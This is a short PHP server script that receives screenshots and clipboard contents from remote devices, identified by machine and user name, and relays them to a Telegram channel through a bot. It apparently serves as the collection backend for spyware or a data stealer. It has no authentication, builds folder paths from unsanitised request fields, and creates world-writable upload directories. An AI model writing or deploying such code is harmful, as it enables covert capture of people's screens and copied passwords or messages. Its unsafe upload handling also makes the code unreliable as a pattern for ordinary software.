<?php

    declare(strict_types=1);

    use Core\ExternalServices\TelegramSender;

    const USE_ROUTER = false;
    require_once $_SERVER['DOCUMENT_ROOT'] . '/core/bootstrap.php';

    $deviceId = $_REQUEST['MachineName'] . '_' . $_REQUEST['UserName'];

    $uploadPath = './uploads/screenshots/' . $deviceId;
    if (!file_exists($uploadPath)) {
        mkdir($uploadPath, 0777, true);
    }

    $uploadfile = $uploadPath . '/' . date("YmdHis") . '_' . basename($_FILES['screenshot']['name']);
    move_uploaded_file($_FILES['screenshot']['tmp_name'], $uploadfile);

    $clipboard = '---- пусто ----';
    if (!empty($_REQUEST['Clipboard'])) {
        $clipboard = iconv('utf-8//IGNORE', 'cp1252//IGNORE', $_REQUEST['Clipboard']);
        $clipboard = iconv('cp1251//IGNORE', 'utf-8//IGNORE', $clipboard);
    }


    (new TelegramSender(TELEGRAM_BOT_TOKEN))->setChat(TELEGRAM_NOTIFICATION_CHANNEL)->sendPhoto(
            $uploadfile,
            '<b>Дата:</b> ' . date('Y-m-d H_i:s') . PHP_EOL . '<b>Имя устройства:</b> ' . $deviceId . PHP_EOL . '<b>Буфер: </b>' . $clipboard
        );
    @unlink($uploadfile);
    echo 'ok';

    //sendTelegram($_REQUEST['Clipboard']);